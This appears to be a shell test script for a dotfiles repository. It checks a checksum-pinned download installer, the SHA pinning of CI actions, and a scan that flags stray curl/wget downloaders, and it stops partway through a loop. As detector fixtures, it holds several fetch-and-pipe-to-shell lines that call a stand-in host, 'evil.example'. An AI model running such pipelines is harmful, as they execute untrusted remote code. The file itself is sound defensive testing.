#!/bin/sh

set -eu

unset DOTFILES_PLATFORM DOTFILES_SHA256_TOOL

fail() {
  echo "check-pins: $*" >&2
  exit 1
}

repo=$(CDPATH='' cd -- "$(dirname "$0")/.." && pwd -P) || exit 1
cd "$repo"
git rev-parse --is-inside-work-tree >/dev/null 2>&1 || \
  fail "repository checks require a Git checkout"

test_root=$(mktemp -d) || exit 1
cleanup() {
  rm -rf "$test_root"
}
trap cleanup EXIT
trap 'cleanup; exit 1' HUP INT TERM

pin_script=$repo/mk/pinned.sh
real_pins=$repo/setup/pins/downloads.txt

echo "check-pins: canonical pins"
DOTFILES_PINS_FILE=$real_pins sh "$pin_script" lint

expect_lint_failure() {
  label=$1
  file=$2
  if DOTFILES_PINS_FILE=$file sh "$pin_script" lint >/dev/null 2>&1; then
    fail "accepted $label"
  fi
}

bad=$test_root/bad-pins.txt
awk 'BEGIN { changed = 0 } !changed && /https:\/\// { sub("https://", "http://"); changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a non-HTTPS URL" "$bad"

awk 'BEGIN { changed = 0 } !changed && /releases\/download\/v2026\.9\.0/ {
  sub("releases/download/v2026.9.0", "releases/download/master"); changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "a mutable URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { $4 = "deadbeef"; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a short checksum" "$bad"

awk 'BEGIN { copied = 0 } { print } !copied && $0 !~ /^#/ { print; copied = 1 }' \
  "$real_pins" > "$bad"
expect_lint_failure "a duplicate platform pin" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { NF = 6; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a six-field pin" "$bad"

awk '!($1 == "mise" && $3 == "darwin-arm64")' "$real_pins" > "$bad"
expect_lint_failure "incomplete mise platform coverage" "$bad"

awk '!($1 == "actionlint" && $3 == "linux-amd64")' "$real_pins" > "$bad"
expect_lint_failure "missing actionlint pin" "$bad"

awk '!($1 == "herdr" && $3 == "darwin-amd64")' "$real_pins" > "$bad"
expect_lint_failure "incomplete Herdr platform coverage" "$bad"

awk '!($1 == "sheldon" && $3 == "linux-arm64")' "$real_pins" > "$bad"
expect_lint_failure "incomplete Sheldon platform coverage" "$bad"

awk '!($1 == "vim-plug" && $3 == "any")' "$real_pins" > "$bad"
expect_lint_failure "missing vim-plug pin" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed {
  $5 = "https://raw.githubusercontent.com/example/repo/0123456789012345678901234567890123456789/main/file"; changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "a mutable raw GitHub URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed {
  $5 = "https://raw.githubusercontent.com/example/repo/not-a-commit/file"; changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "an unpinned raw GitHub URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { $6 = "../mise"; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "an unsafe archive member" "$bad"

if grep -n 'mise\.run' Makefile mk/config.mk mk/tools.mk >/dev/null 2>&1; then
  fail "mise.run remains in bootstrap code"
fi
if grep -Eiq '^[[:space:]]*("[^"]*herdr[^"]*"|herdr)[[:space:]]*=' \
  mise/.config/mise/config.toml 2>/dev/null; then
  fail "Herdr remains configured through mise instead of verified download pins"
fi
if grep -nE 'crate\.sh|SHELDON_URL|SHELDON_REPO|VIM_PLUG_URL|vim-plug/master|bash -s' \
  Makefile mk/config.mk mk/tools.mk >/dev/null 2>&1; then
  fail "legacy unverified installer remains in bootstrap code"
fi
legacy_brew=$(
  grep -nE 'Homebrew/install|BREW_INSTALL_URL|/bin/bash[[:space:]]+-c' \
    Makefile mk/*.mk 2>/dev/null | \
    grep -v -E '^mk/(checks\.mk|test-)' || true
)
[ -z "$legacy_brew" ] || fail "legacy Homebrew installer remains in bootstrap code: $legacy_brew"
if git grep -n 'fzf#install' -- 'vim/*' 'nvim/*' >/dev/null 2>&1; then
  fail "Vim still installs an unverified fzf binary"
fi

workflow_files=$(git -c core.quotePath=false ls-files \
  '.github/workflows/*.yml' '.github/workflows/*.yaml') || \
  fail "could not enumerate workflow files"
[ -n "$workflow_files" ] || fail "no workflow files found"
tagged_actions=$(
  while IFS= read -r file; do
    grep -HnE 'uses:[[:space:]]*[^@[:space:]]+@v[0-9]' "$file" || true
  done <<EOF
$workflow_files
EOF
)
[ -z "$tagged_actions" ] || fail "workflow action uses a mutable tag: $tagged_actions"
unpinned_actions=$(
  while IFS= read -r file; do
    grep -HnE 'uses:' "$file" || true
  done <<EOF
$workflow_files
EOF
)
unpinned_actions=$(printf '%s\n' "$unpinned_actions" | \
  grep -Ev 'uses:[[:space:]]*[^@[:space:]]+@[0-9a-f]{40}[[:space:]]+# v[0-9]' || true)
[ -z "$unpinned_actions" ] || fail "workflow action lacks a SHA and version comment: $unpinned_actions"
check_checkout_credentials() {
  awk '
    function finish_step() {
      if (checkout && !credentials) failed = 1
      checkout = 0
      with_block = 0
      credentials = 0
    }
    /^[[:space:]]*-[[:space:]]+[A-Za-z0-9_-]+:/ { finish_step() }
    /uses:[[:space:]]*actions\/checkout@/ { checkout = 1; next }
    checkout && /^[[:space:]]*with:[[:space:]]*$/ { with_block = 1; next }
    checkout && with_block && \
      /^[[:space:]]*persist-credentials:[[:space:]]*false([[:space:]]|$)/ {
        credentials = 1
      }
    END { finish_step(); exit failed }
  ' "$1"
}
while IFS= read -r file; do
  check_checkout_credentials "$file" || \
    fail "checkout action lacks persist-credentials: false in its with block: $file"
done <<EOF
$workflow_files
EOF
action_fixture=$test_root/action.yml
printf '%s\n' \
  'steps:' \
  '  - uses: actions/checkout@v7' \
  '  - uses: example/action@0123456789012345678901234567890123456789' \
  > "$action_fixture"
grep -Eq 'uses:[[:space:]]*[^@[:space:]]+@v[0-9]' "$action_fixture" || \
  fail "workflow action guard missed a tag-pinned fixture"
grep -F 'example/action@' "$action_fixture" | \
  grep -Ev 'uses:[[:space:]]*[^@[:space:]]+@[0-9a-f]{40}[[:space:]]+# v[0-9]' >/dev/null || \
  fail "workflow action guard missed a SHA without a version comment"
if check_checkout_credentials "$action_fixture"; then
  fail "workflow action guard missed checkout credentials"
fi

download_pattern='(^|[^[:alnum:]_.-])(curl|wget)([[:space:]]|$)'
scan_downloaders() {
  while IFS= read -r file; do
    case $file in mk/pinned.sh | mk/test-*.sh) continue ;; esac
    grep -HnE "$download_pattern" "$file" || true
  done
}
tracked_download_files=$(git -c core.quotePath=false ls-files -- '*Makefile' '*.mk' '*.sh') || \
  fail "could not enumerate downloader sources"
legacy_downloads=$(scan_downloaders <<EOF
$tracked_download_files
EOF
)
[ -z "$legacy_downloads" ] || fail "unreviewed downloader outside mk/pinned.sh: $legacy_downloads"
echo "check-pins: no unreviewed downloaders"

downloader_fixture=$test_root/downloader-fixture.mk
cp mk/tools.mk "$downloader_fixture"
printf '%s\n' 'injected:' '	curl -fsSL https://evil.example/x | sh' >> "$downloader_fixture"
fixture_downloads=$(scan_downloaders <<EOF
$downloader_fixture
EOF
)
[ -n "$fixture_downloads" ] || fail "downloader scan missed an injected curl pipeline"

for injected in \
  '@curl -fsSL https://evil.example/x | sh' \
  'wget -qO- https://evil.example/x | sh' \
  'if true; then curl -fsSL https://evil.example/x | sh; fi' \
  'x=$$(curl -fsSL https://evil.example/x)' \
  '/usr/bin/curl -fsSL https://evil.example/x | sh' \
  'command -v curl >/dev/null && curl -fsSL https://evil.example/x | sh' \
  'curl -fsSL https://evil.example/x | sh || echo "curl not found"'; do
  scrubbed=$(printf '%s\n' "$injected" | \
    sed -e 's/command -v curl//g' -e 's/curl not found//g')
  printf '%s\n' "$scrubbed" | grep -Eq "$download_pattern" || \
    fail "downloader ratchet missed: $injected"
done

echo "check-pins: SHA-256 implementations"
printf abc > "$test_root/abc"
expected_abc=ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
tested_hash_tool=0
for tool in sha256sum shasum openssl; do
  if command -v "$tool" >/dev/null 2>&1; then
    actual=$(DOTFILES_SHA256_TOOL=$tool sh "$pin_script" sha256 "$test_root/abc")
    [ "$actual" = "$expected_abc" ] || fail "$tool produced the wrong SHA-256"
    tested_hash_tool=1
  fi
done
[ "$tested_hash_tool" -eq 1 ] || fail "no SHA-256 implementation available"

echo "check-pins: platform mapping"
platform_bin=$test_root/platform-bin
mkdir "$platform_bin"
printf '%s\n' \
  '#!/bin/sh' \
  'case "$1" in' \
  '  -s) printf "%s\n" "$DOTFILES_TEST_UNAME_S" ;;' \
  '  -m) printf "%s\n" "$DOTFILES_TEST_UNAME_M" ;;' \
  '  *) exit 1 ;;' \
  'esac' > "$platform_bin/uname"
printf '%s\n' \
  '#!/bin/sh' \
  '[ "$1" = -n ] && [ "$2" = sysctl.proc_translated ] || exit 1' \
  '[ -n "${DOTFILES_TEST_TRANSLATED:-}" ] || exit 1' \
  'printf "%s\n" "$DOTFILES_TEST_TRANSLATED"' > "$platform_bin/sysctl"
chmod +x "$platform_bin/uname" "$platform_bin/sysctl"

check_platform() {
  system=$1
  machine=$2
  translated=$3
  expected=$4
  actual=$(env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_TEST_UNAME_S="$system" DOTFILES_TEST_UNAME_M="$machine" \
    DOTFILES_TEST_TRANSLATED="$translated" sh "$pin_script" platform)
  [ "$actual" = "$expected" ] || \
    fail "$system $machine translated=$translated mapped to $actual, not $expected"
}

check_platform Linux x86_64 '' linux-amd64
check_platform Linux amd64 '' linux-amd64
check_platform Linux aarch64 '' linux-arm64
check_platform Linux arm64 '' linux-arm64
check_platform Darwin x86_64 0 darwin-amd64
check_platform Darwin x86_64 1 darwin-arm64
check_platform Darwin arm64 '' darwin-arm64

if env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_UNAME_S=Linux DOTFILES_TEST_UNAME_M=riscv64 \
  sh "$pin_script" platform >/dev/null 2>&1; then
  fail "accepted unsupported riscv64"
fi
if env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_UNAME_S=FreeBSD DOTFILES_TEST_UNAME_M=amd64 \
  sh "$pin_script" platform >/dev/null 2>&1; then
  fail "accepted unsupported FreeBSD"
fi

echo "check-pins: verified installer"
fixtures=$test_root/fixtures
fixture_tree=$test_root/fixture-tree
stub_bin=$test_root/stub-bin
mkdir -p "$fixtures" "$fixture_tree/mise/bin" "$stub_bin"
printf '%s\n' '#!/bin/sh' 'echo "mise 1.2.3"' > "$fixture_tree/mise/bin/mise"
chmod +x "$fixture_tree/mise/bin/mise"
archive=$fixtures/mise-1.2.3.tar.gz
(cd "$fixture_tree" && tar -czf "$archive" mise/bin/mise)
archive_hash=$(sh "$pin_script" sha256 "$archive")
member_hash=$(sh "$pin_script" sha256 "$fixture_tree/mise/bin/mise")
fixture_pins=$test_root/downloads.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$fixture_pins"

sheldon_tree=$test_root/sheldon-tree
mkdir "$sheldon_tree"
printf '%s\n' \
  '#!/bin/sh' \
  'echo "sheldon 1.2.3 (abcdef0 2025-01-01)"' \
  'echo "rustc 1.88.0"' > "$sheldon_tree/sheldon"
chmod +x "$sheldon_tree/sheldon"
sheldon_archive=$fixtures/sheldon-1.2.3.tar.gz
(cd "$sheldon_tree" && tar -czf "$sheldon_archive" sheldon)
sheldon_archive_hash=$(sh "$pin_script" sha256 "$sheldon_archive")
sheldon_member_hash=$(sh "$pin_script" sha256 "$sheldon_tree/sheldon")
printf '%s\n' \
  "sheldon 1.2.3 linux-amd64 $sheldon_archive_hash https://github.com/example/sheldon/releases/download/v1.2.3/sheldon-1.2.3.tar.gz sheldon $sheldon_member_hash" \
  >> "$fixture_pins"

herdr_fixture=$fixtures/herdr-linux-x86_64
printf '%s\n' \
  '#!/bin/sh' \
  'case ${1:-} in' \
  '  --version | -V) echo "herdr 1.2.3" ;;' \
  '  config) [ "${2:-}" = check ] && [ -f "$HERDR_CONFIG_PATH" ] && echo "config: ok" ;;' \
  '  integration)' \
  '    [ "${2:-}" = install ] && [ -n "${3:-}" ] || exit 1' \
  '    printf "%s\n" "$3" >> "$DOTFILES_TEST_HERDR_LOG" ;;' \
  '  *) exit 1 ;;' \
  'esac' > "$herdr_fixture"
chmod +x "$herdr_fixture"
herdr_hash=$(sh "$pin_script" sha256 "$herdr_fixture")
printf '%s\n' \
  "herdr 1.2.3 linux-amd64 $herdr_hash https://github.com/example/herdr/releases/download/v1.2.3/herdr-linux-x86_64" \
  >> "$fixture_pins"

printf 'fixture plug.vim\n' > "$fixtures/plug.vim"
vim_plug_hash=$(sh "$pin_script" sha256 "$fixtures/plug.vim")
printf '%s\n' \
  "vim-plug 1.0.0 any $vim_plug_hash https://raw.githubusercontent.com/example/vim-plug/0123456789012345678901234567890123456789/plug.vim" \
  >> "$fixture_pins"

printf '%s\n' \
  '#!/bin/sh' \
  'printf "%s\n" "$*" >> "$DOTFILES_TEST_CURL_LOG"' \
  'output=' \
  'url=' \
  'saw_proto=0' \
  'saw_redirect=0' \
  'while [ "$#" -gt 0 ]; do' \
  '  case $1 in' \
  '    --proto) shift; [ "${1:-}" = "=https" ] || exit 91; saw_proto=1 ;;' \
  '    --proto-redir) shift; [ "${1:-}" = "=https" ] || exit 92; saw_redirect=1 ;;' \
  '    -o) shift; output=${1:-} ;;' \
  '    https://*) url=$1 ;;' \
  '  esac' \
  '  shift' \
  'done' \
  '[ "$saw_proto" -eq 1 ] && [ "$saw_redirect" -eq 1 ] || exit 93' \
  '[ -n "$output" ] && [ -n "$url" ] || exit 94' \
  'case ${DOTFILES_TEST_CURL_MODE:-copy} in' \
  '  fail) exit 95 ;;' \
  '  truncate) printf truncated > "$output" ;;' \
  '  copy) cp "$DOTFILES_TEST_FIXTURES/${url##*/}" "$output"; chmod 0600 "$output" ;;' \
  '  *) exit 96 ;;' \
  'esac' > "$stub_bin/curl"
chmod +x "$stub_bin/curl"

curl_log=$test_root/curl.log
destination=$test_root/bin/mise
run_installer() {
  env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$fixture_pins" \
    DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
    DOTFILES_TEST_CURL_MODE=copy \
    sh "$pin_script" install mise "$destination" 0755
}

: > "$curl_log"
run_installer >/dev/null
[ -x "$destination" ] || fail "fresh install is not executable"
[ "$(sh "$pin_script" sha256 "$destination")" = "$member_hash" ] || \
  fail "fresh install has the wrong content"
[ "$(wc -l < "$curl_log" | tr -d ' ')" -eq 1 ] || fail "fresh install did not download once"

: > "$curl_log"
run_installer >/dev/null
[ ! -s "$curl_log" ] || fail "pinned rerun accessed the network"

printf drifted > "$destination"
: > "$curl_log"
run_installer > "$test_root/replace.out"
grep -F "replacing $destination" "$test_root/replace.out" >/dev/null || \
  fail "drift replacement was not reported"
[ "$(sh "$pin_script" sha256 "$destination")" = "$member_hash" ] || \
  fail "drifted install was not repaired"

assert_failed_install_preserves_destination() {
  label=$1
  mode=$2
  pins=$3
  printf keep-this > "$destination"
  before=$(sh "$pin_script" sha256 "$destination")
  if env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$pins" \
    DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
    DOTFILES_TEST_CURL_MODE="$mode" \
    sh "$pin_script" install mise "$destination" 0755 >/dev/null 2>&1; then
    fail "$label succeeded"
  fi
  after=$(sh "$pin_script" sha256 "$destination")
  [ "$before" = "$after" ] || fail "$label changed the existing destination"
  for leaked in "$test_root/bin"/.pinned.*; do
    if [ -e "$leaked" ] || [ -L "$leaked" ]; then
      fail "$label leaked a temporary directory"
    fi
  done
}

bad_archive_pins=$test_root/bad-archive.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $(printf '%064d' 0) https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$bad_archive_pins"
assert_failed_install_preserves_destination "archive checksum mismatch" copy "$bad_archive_pins"

bad_member_pins=$test_root/bad-member.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $(printf '%064d' 0)" \
  > "$bad_member_pins"
assert_failed_install_preserves_destination "member checksum mismatch" copy "$bad_member_pins"
assert_failed_install_preserves_destination "curl failure" fail "$fixture_pins"
assert_failed_install_preserves_destination "truncated download" truncate "$fixture_pins"

missing_member_pins=$test_root/missing-member.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/missing $member_hash" \
  > "$missing_member_pins"
assert_failed_install_preserves_destination "missing archive member" copy "$missing_member_pins"

symlink_tree=$test_root/symlink-tree
mkdir -p "$symlink_tree/mise/bin"
ln -s target "$symlink_tree/mise/bin/mise"
symlink_archive=$fixtures/symlink.tar.gz
(cd "$symlink_tree" && tar -czf "$symlink_archive" mise/bin/mise)
symlink_hash=$(sh "$pin_script" sha256 "$symlink_archive")
symlink_pins=$test_root/symlink-pins.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $symlink_hash https://github.com/example/mise/releases/download/v1.2.3/symlink.tar.gz mise/bin/mise $member_hash" \
  > "$symlink_pins"
assert_failed_install_preserves_destination "symlink archive member" copy "$symlink_pins"

wrong_version_pins=$test_root/wrong-version.txt
printf '%s\n' \
  "mise 9.9.9 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v9.9.9/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$wrong_version_pins"
assert_failed_install_preserves_destination "version mismatch" copy "$wrong_version_pins"

raw=$fixtures/raw.txt
printf 'raw fixture\n' > "$raw"
raw_hash=$(sh "$pin_script" sha256 "$raw")
raw_pins=$test_root/raw-pins.txt
printf '%s\n' \
  "raw-tool 1.0.0 any $raw_hash https://raw.githubusercontent.com/example/repo/0123456789012345678901234567890123456789/raw.txt" \
  > "$raw_pins"
raw_destination=$test_root/raw-installed.txt
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_destination" 0644 >/dev/null
[ "$(sh "$pin_script" sha256 "$raw_destination")" = "$raw_hash" ] || \
  fail "raw-file install has the wrong content"

raw_executable=$fixtures/raw-tool
printf '%s\n' '#!/bin/sh' 'echo "raw-tool 1.0.0"' > "$raw_executable"
raw_executable_hash=$(sh "$pin_script" sha256 "$raw_executable")
raw_executable_pins=$test_root/raw-executable-pins.txt
printf '%s\n' \
  "raw-tool 1.0.0 any $raw_executable_hash https://github.com/example/raw-tool/releases/download/v1.0.0/raw-tool" \
  > "$raw_executable_pins"
raw_executable_destination=$test_root/raw-tool
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_executable_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_executable_destination" 0755 >/dev/null
[ -x "$raw_executable_destination" ] || fail "raw executable install is not executable"

chmod 0644 "$raw_executable_destination"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_executable_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_executable_destination" 0755 >/dev/null
[ -x "$raw_executable_destination" ] || fail "pinned rerun did not repair executable mode"
[ ! -s "$curl_log" ] || fail "mode repair accessed the network"

fetch_destination=$test_root/fetched.txt
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" fetch raw-tool "$fetch_destination"
[ "$(sh "$pin_script" sha256 "$fetch_destination")" = "$raw_hash" ] || \
  fail "fetch has the wrong content"

if env DOTFILES_PLATFORM=darwin-arm64 DOTFILES_PINS_FILE="$fixture_pins" \
  sh "$pin_script" status mise "$destination" >/dev/null 2>&1; then
  fail "accepted a pin for the wrong platform"
fi

echo "check-pins: Make wiring"
make_destination=$test_root/make-bin/mise
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" MISE_BIN="$make_destination" mise >/dev/null
[ -x "$make_destination" ] || fail "make mise did not install the fixture"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" MISE_BIN="$make_destination" mise >/dev/null
[ ! -s "$curl_log" ] || fail "make mise rerun accessed the network"

herdr_destination=$test_root/make-bin/herdr
run_make_herdr() {
  env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
    DOTFILES_TEST_FIXTURES="$fixtures" \
    make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" \
      HERDR_BIN="$herdr_destination" herdr
}

: > "$curl_log"
run_make_herdr >/dev/null
[ -x "$herdr_destination" ] || fail "make herdr did not install the fixture"
[ "$(sh "$pin_script" sha256 "$herdr_destination")" = "$herdr_hash" ] || \
  fail "make herdr installed the wrong binary"
[ "$(wc -l < "$curl_log" | tr -d ' ')" -eq 1 ] || \
  fail "fresh Herdr install did not download once"

: > "$curl_log"
run_make_herdr >/dev/null
[ ! -s "$curl_log" ] || fail "pinned Herdr rerun accessed the network"

printf drifted > "$herdr_destination"
: > "$curl_log"
run_make_herdr > "$test_root/herdr-replace.out"
grep -F "replacing $herdr_destination" "$test_root/herdr-replace.out" >/dev/null || \
  fail "drifted Herdr replacement was not reported"
[ "$(sh "$pin_script" sha256 "$herdr_destination")" = "$herdr_hash" ] || \
  fail "drifted Herdr install was not repaired"
[ -x "$herdr_destination" ] || fail "drifted Herdr repair did not restore executable mode"

herdr_integration_log=$test_root/herdr-integrations.log
: > "$herdr_integration_log"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  DOTFILES_TEST_HERDR_LOG="$herdr_integration_log" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" \
    HERDR_BIN="$herdr_destination" HERDR_INTEGRATIONS="claude codex" \
    herdr-integrations >/dev/null
[ "$(cat "$herdr_integration_log")" = "$(printf 'claude\ncodex')" ] || \
  fail "Herdr integrations did not honor the configured order"
[ ! -s "$curl_log" ] || fail "Herdr integration restore redownloaded a pinned binary"
if env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  DOTFILES_TEST_HERDR_LOG="$herdr_integration_log" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" \
    HERDR_BIN="$herdr_destination" HERDR_INTEGRATIONS= \
    herdr-integrations >/dev/null 2>&1; then
  fail "Herdr integrations accepted an empty target list"
fi

sheldon_destination=$test_root/make-bin/sheldon
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" \
    SHELDON_BIN="$sheldon_destination" sheldon >/dev/null
[ -x "$sheldon_destination" ] || fail "make sheldon did not install the fixture"
[ "$(sh "$pin_script" sha256 "$sheldon_destination")" = "$sheldon_member_hash" ] || \
  fail "root archive member installed with the wrong content"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" \
    SHELDON_BIN="$sheldon_destination" sheldon >/dev/null
[ ! -s "$curl_log" ] || fail "make sheldon rerun accessed the network"

echo "check-pins: Vim bootstrap wiring"
vim_home=$test_root/vim-home
vim_log=$test_root/vim.log
real_git=$(command -v git) || fail "git is required"
mkdir -p "$vim_home/.vim/config" "$vim_home/.vim/autoload"
: > "$vim_home/.vim/config/plugins.vim"
# These single-quoted lines are the body of the generated Vim stub.
# shellcheck disable=SC2016
printf '%s\n' \
  '#!/bin/sh' \
  '[ -f "$HOME/.vim/autoload/plug.vim" ] || exit 97' \
  'printf "%s\n" "$*" >> "$DOTFILES_TEST_VIM_LOG"' > "$stub_bin/vim"
chmod +x "$stub_bin/vim"
# These single-quoted lines are the body of the generated Git stub.
# shellcheck disable=SC2016
printf '%s\n' \
  '#!/bin/sh' \
  'if [ "${DOTFILES_TEST_GIT_MODE:-}" = fail-ls-files ]; then' \
  '  case " $* " in *" ls-files "*) exit 98 ;; esac' \
  'fi' \
  'exec "$DOTFILES_REAL_GIT" "$@"' > "$stub_bin/git"
chmod +x "$stub_bin/git"

run_vim_plugins() {
  env -i HOME="$vim_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
    DOTFILES_TEST_FIXTURES="$fixtures" DOTFILES_TEST_VIM_LOG="$vim_log" \
    DOTFILES_REAL_GIT="$real_git" \
    make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" vim-plugins
}

: > "$curl_log"
: > "$vim_log"
run_vim_plugins >/dev/null
[ "$(sh "$pin_script" sha256 "$vim_home/.vim/autoload/plug.vim")" = "$vim_plug_hash" ] || \
  fail "make vim-plugins installed the wrong plug.vim"
[ ! -x "$vim_home/.vim/autoload/plug.vim" ] || fail "plug.vim is executable"
[ "$(wc -l < "$curl_log" | tr -d ' ')" -eq 1 ] || \
  fail "fresh vim-plug install did not download once"
grep -F 'PlugInstall --sync' "$vim_log" >/dev/null || fail "Vim plugins were not synced"

: > "$curl_log"
: > "$vim_log"
run_vim_plugins >/dev/null
[ ! -s "$curl_log" ] || fail "pinned vim-plug rerun accessed the network"
[ -s "$vim_log" ] || fail "pinned vim-plug rerun did not sync plugins"

printf drifted > "$vim_home/.vim/autoload/plug.vim"
: > "$curl_log"
run_vim_plugins > "$test_root/vim-replace.out"
grep -F "replacing $vim_home/.vim/autoload/plug.vim" "$test_root/vim-replace.out" >/dev/null || \
  fail "drifted vim-plug replacement was not reported"
[ "$(sh "$pin_script" sha256 "$vim_home/.vim/autoload/plug.vim")" = "$vim_plug_hash" ] || \
  fail "drifted vim-plug was not repaired"

bad_vim_pins=$test_root/bad-vim-pins.txt
printf '%s\n' \
  "vim-plug 1.0.0 any $(printf '%064d' 0) https://raw.githubusercontent.com/example/vim-plug/0123456789012345678901234567890123456789/plug.vim" \
  > "$bad_vim_pins"
printf keep-this > "$vim_home/.vim/autoload/plug.vim"
vim_before=$(sh "$pin_script" sha256 "$vim_home/.vim/autoload/plug.vim")
: > "$vim_log"
if env -i HOME="$vim_home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" DOTFILES_TEST_VIM_LOG="$vim_log" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$bad_vim_pins" vim-plugins \
    > "$test_root/vim-bad.out" 2>&1; then
  fail "checksum-mismatched vim-plug install succeeded"
fi
[ "$(sh "$pin_script" sha256 "$vim_home/.vim/autoload/plug.vim")" = "$vim_before" ] || \
  fail "failed vim-plug install changed the existing destination"
[ ! -s "$vim_log" ] || fail "Vim ran after vim-plug verification failed"
for leaked in "$vim_home/.vim/autoload"/.pinned.*; do
